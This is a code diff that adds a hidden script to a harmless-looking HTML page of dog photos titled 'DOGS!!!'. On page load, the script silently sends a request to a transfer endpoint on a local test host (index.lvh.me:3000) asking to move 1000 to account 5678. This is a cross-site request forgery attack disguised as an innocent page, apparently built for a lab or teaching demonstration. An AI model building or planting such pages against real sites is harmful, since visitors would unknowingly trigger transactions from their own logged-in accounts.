@@ -1,11 +1,20 @@
 <html>
     <head>
         <title>DOGS!!!</title>
+        <script type="text/javascript">
+            function runOnLoad() {
+                const Http = new XMLHttpRequest();
+                const url = "http://index.lvh.me:3000/transfer?acc=5678" +
+                "&amount=1000";
+                Http.open("GET", url);
+                Http.send();
+            }
+            window.onload = runOnLoad;
+        </script>
     </head>
     <body>
         <img src="https://images.pexels.com/photos/1254140/pexels-photo-1254140.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=750&w=1260" alt="pic1" style="width:500px;" />
         <img src="https://images.pexels.com/photos/1695632/pexels-photo-1695632.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=750&w=1260" alt="pic2" style="width:500px;" />
         <img src="https://images.pexels.com/photos/2570192/pexels-photo-2570192.jpeg?auto=compress&cs=tinysrgb&dpr=2&h=750&w=1260" alt="pic3" style="width:500px;" /><br>
-        <p style="text-align: center;">Click for more!</p>
     </body>
 </html>
